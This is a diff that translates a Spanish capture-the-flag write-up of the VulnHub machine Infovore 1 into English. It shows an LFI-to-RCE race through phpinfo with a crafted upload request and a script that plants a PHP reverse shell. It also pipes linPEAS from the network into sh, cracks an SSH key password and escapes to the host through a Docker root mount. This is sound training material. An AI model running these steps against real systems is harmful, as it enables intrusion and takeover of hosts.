@@ -1,41 +1,40 @@
-
 ---
 aliases: []
 tags:
-    - writeup
-    - maquina
-    - vulnhub
-    - linux
-    - lfi
-    - rce
-    - reverse-shell
-    - docker
-    - ssh
-    - capabilities
-maquina: Infovore 1
-plataforma: Linux
-dificultad: null
-fecha_resolucion: null
-tecnicas_clave:
-    - LFI to RCE through PHP info and file upload
-    - Docker escape
-    - SSH key reuse
-    - tar capability abuse
+  - writeup
+  - machine
+  - vulnhub
+  - linux
+  - lfi
+  - rce
+  - reverse-shell
+  - docker
+  - ssh
+  - capabilities
+machine: Infovore 1
+platform: Linux
+difficulty: Easy/Intermediate
+date_solved: 2026-09-25
+key_techniques:
+  - LFI to RCE through PHP info and file upload
+  - Docker escape
+  - SSH key reuse
+  - tar capability abuse
 cve: []
-vector_inicial: LFI to RCE through PHP info and file upload
-escalada_privilegios: Docker group escape and tar capability abuse
-autor: null
+initial_vector: LFI to RCE through PHP info and file upload
+privilege_escalation: Docker group escape and tar capability abuse
+author: null
 writeup_url: https://www.vulnhub.com/entry/infovore-1,496/
 ---
 
-- **Máquina Infovore 1**: [https://www.vulnhub.com/entry/infovore-1,496/](https://www.vulnhub.com/entry/infovore-1,496/)
+- **Infovore 1 machine**: [https://www.vulnhub.com/entry/infovore-1,496/](https://www.vulnhub.com/entry/infovore-1,496/)
 
-### Reconocimiento
-Como siempre empezamos la fase de reconocimiento con un *arp-scan* en el local host para detectar la ip de la máquina víctima. 
+### Reconnaissance
+As always we start the recon phase with an *arp-scan* on the local network to detect the victim machine's IP.
 ```bash
 arp-scan -I ens33 --localnet
 ```
-Una vez descubierta la ip (192.168.18.240) procedemos con el escaneo de puertos en Nmap.
+Once we have the IP (192.168.18.240) we proceed with a port scan in Nmap.
 ```bash
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.18.240 -oG allPorts 
 
@@ -43,10 +42,10 @@ nmap -sC -sV -p80 192.168.18.240 -oN Targgeted
 
 nmap --script http-enum -p80 192.168.18.240 -oN webScan
 ```
-Encontramos un directorio */include me* y un */info.php*. El segundo nos proporciona bastantes informaciones valiosas sobre versión de php y futuros vectores de ataque pero por el momento aún no podemos hacer gran cosa. El *file_uploads* esta en on lo que significa que podemos hacer un *LFI to RCE* abusando de este recurso, enviando una solicitud por *POST*.
+We find a */include me* directory and an */info.php*. The latter gives us a lot of valuable info about the PHP version and future attack vectors, but for now we can't do much. *file_uploads* is on, which means we can achieve *LFI to RCE* by abusing this via a *POST* request.
 https://hacktricks.wiki/es/pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html
 
-Abrimos el burpsuite e interceptamos el info.php, cambiamos el método de GET a POST y añadimos unas lineas de texto plano.
+We open Burp Suite and intercept info.php, change the method from GET to POST and add a few plain-text lines.
 ```burpsuite
 POST /info.php HTTP/1.1
 
@@ -86,13 +85,13 @@ Content-Type: text/plain
 
 ----pwned
 ```
-Si enviamos la request, podemos ver que la página intenta crear en un directorio temporal, el cmd.php. Esto significa que si encontramos una forma de apuntar a ese recurso, que ya existe y logramos interpretar el código php, tendriamos una reverse shell y estariamos dentro.
-Para encontrar esa forma de apuntar al archivo, vamos a hacer un *wfuzz* a la ruta principal.
+When we send the request, we can see the page tries to create cmd.php in a temporary directory. This means that if we find a way to point at that resource, which already exists, and get the PHP code executed, we'd have a reverse shell and be in.
+To find that way to point at the file, we run *wfuzz* against the main path.
 ```bash
 wfuzz -c --hl=136 -t 200 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u "http://192.168.18.240/index.php?FUZZ=etc/passwd"
 ```
-Y encontramos un parámetro, *filename*. Asi que ahora con burpsuite tenemos una via potencial de crear un archivo y con filename podemos interpretarlo, pero acontece que el archivo que creamos inmediatamente, se borra, con lo cuál lo que vamos a hacer es estar enviando continuamente peticiones en filename para que cuando se cree el archivo, inmediatamente, se interprete. 
-Vamos a hacerlo con un script de la página web anteriormente mencionada:
+We find a *filename* parameter. So now with Burp Suite we have a potential way to create a file and execute it via filename, but the file we create is immediately deleted, so what we'll do is continuously send requests on filename so that, the moment the file is created, it gets executed.
+We'll do this with a script from the website mentioned above:
 ```python
 #!/usr/bin/env python3
 # Original credits: https://github.com/diegoalbuquerque
@@ -331,7 +330,7 @@ if __name__ == "__main__":
     print("Don't forget to modify the LFI URL")
     main()
 ```
-Aqui solamente tendremos que añadir la ip del atacante en donde corresponde, ponernos por escucha con nc por el 443 y añadir la ip y puerto de la máquina al ejecutar el script. Ya tendríamos una Shell, procedemos con el tratamiento de la tty:
+Here we just need to add the attacker IP where it belongs, start a listener with nc on 443, and pass the machine's IP and port when running the script. That gives us a shell, and we proceed with the TTY upgrade:
 ```shell
 script /dev/null -c bash
 #ctrl + z
@@ -342,41 +341,41 @@ export TERM=xterm
 export SHELL=bash
 stty rows 44 columns 184
 ```
-El usuario es *www-data* y si hacemos un *hostname -I* vemos que la ip es diferente, lo que nos indica que estamos en un contenedor. 
+The user is *www-data*, and running *hostname -I* shows a different IP, which tells us we're inside a container.
 
-### Escalada de privilegios
-Para la escalada necesitaremos escapar del contenedor, después de probar formas típicas de escalado como: capabilites, archivos que contengan config, usuarios con acceso a "sh$", achivos con passwd... Pero nada dio resultado o se encontro nada relevante. 
-Vamos a proceder a utilizar la herramienta *linPEAS*, herramienta que se puede usar en el OSCP porque no explota, solo enumera.
+### Privilege escalation
+To escalate we'll need to escape the container. After trying the usual escalation paths — capabilities, config files, users with "sh$" access, files containing passwd... — nothing worked or turned up anything relevant.
+We proceed to use *linPEAS*, a tool allowed on the OSCP because it doesn't exploit, it only enumerates.
 ```bash
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ``` 
-y encontramos MUCHAS cosas, pero vamos a centrarnos en un archivo oculto en la raíz llamado *.oldkeys.tgz*. Nos lo transladamos al directorio /tmp/ y le cambiamos el nombre para que no sea un archivo oculto y le hacemos un *tar -xf* para descomprimirlo.
-Tenemos dos archivos, uno de ellos (root) es la clave privada y cifrada para root, además de eso podemos ver que el puerto 22 de la máquina víctima esta abieta.
+and we find LOTS of things, but let's focus on a hidden file in the root called *.oldkeys.tgz*. We move it to /tmp/, rename it so it's no longer hidden, and run *tar -xf* to extract it.
+We get two files; one of them (root) is the encrypted private key for root. On top of that, we can see that port 22 of the victim machine is open.
 ```bash
 hostname -I
 cat /proc/net/arp
 echo '' > /dev/tcp/192.168.150.1/22
 ```
-Por tanto, podríamos intentar usar esta clave privada para conectarnos como root a la máquina principal.
+So we could try using this private key to connect as root to the main machine.
 
-Vamos a utilizar john para crackearlo:
+We'll use john to crack it:
 ```bash
 nvim id_rsa
 python2.7 /usr/lib/john/ssh2john.py id_rsa
 nvim hash 
 john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
 ```
-El id_rsa nos da la palabra *choclate93* , con esta contraseña no nos podemos conectar por ssh a la máquina principal pero por lo menos podemos ser root en el contenedor.
-![[Pasted image 20260925132650.png]]
-Nos dan una primera FLAG, pero la idea es escapar del contenedor.
-Para acceder a la máquina principal, si vamos al *~/.ssh* alli encontraremos las claves ssh ademas de un archivo *know_hosts* donde figura el usuario admin, lo que nos da a entender que puede haber una cofiabilidad entre ese usuario y la máquina principal, debido a las claves que están seteadas. 
-Nos intentamos conectar como usuario admin a la máquina principal por ssh y tenemos una reutilización de credenciales, *choclate93* en este caso.
-![[Pasted image 20260925133555.png]]
-Ahora tendriamos que escalar como root en la principal. 
-Estamos en el grupo Docker, entonces podemos crear un contenedor donde abusando de monturas, montar toda la raiz del sistema en un contenedor, obteniendo acceso total a todo.
+The id_rsa gives us the word *choclate93*; with this password we can't connect over SSH to the main machine, but at least we can become root in the container.
+![[Pasted image 20260925132650.png|Root in the container and first flag]]
+We get a first FLAG, but the goal is to escape the container.
+To reach the main machine, if we go to *~/.ssh* we'll find the SSH keys plus a *known_hosts* file listing the admin user, which suggests there may be a trust relationship between that user and the main machine thanks to the configured keys.
+We try to connect as the admin user to the main machine over SSH and hit credential reuse — *choclate93* in this case.
+![[Pasted image 20260925133555.png|SSH access as admin to the main machine]]
+Now we'd need to escalate to root on the main machine.
+We're in the Docker group, so we can create a container and, by abusing mounts, mount the entire system root inside a container, gaining full access to everything.
 ```bash
 docker run -dit -v /:/mnt/root --name privesc theart42/infovore
 ```
-![[Pasted image 20260925134459.png]]
-Lo que hacemos en la imagen es entrar a la montura de docker del sistema, y darle permisos a la bash. Luego nos salimos y si lanzamos un *bash -p* estaremos como root. Nos metemos al directorio y vemos la última FLAG.
-![[Pasted image 20260925135210.png]]
+![[Pasted image 20260925134459.png|Host root mounted in a Docker container and SUID on bash]]
+What we do in the image is enter the Docker mount of the system and set the SUID bit on bash. Then we exit, and running *bash -p* makes us root. We go to the directory and read the last FLAG.
+![[Pasted image 20260925135210.png|Root shell on the host and final flag]]
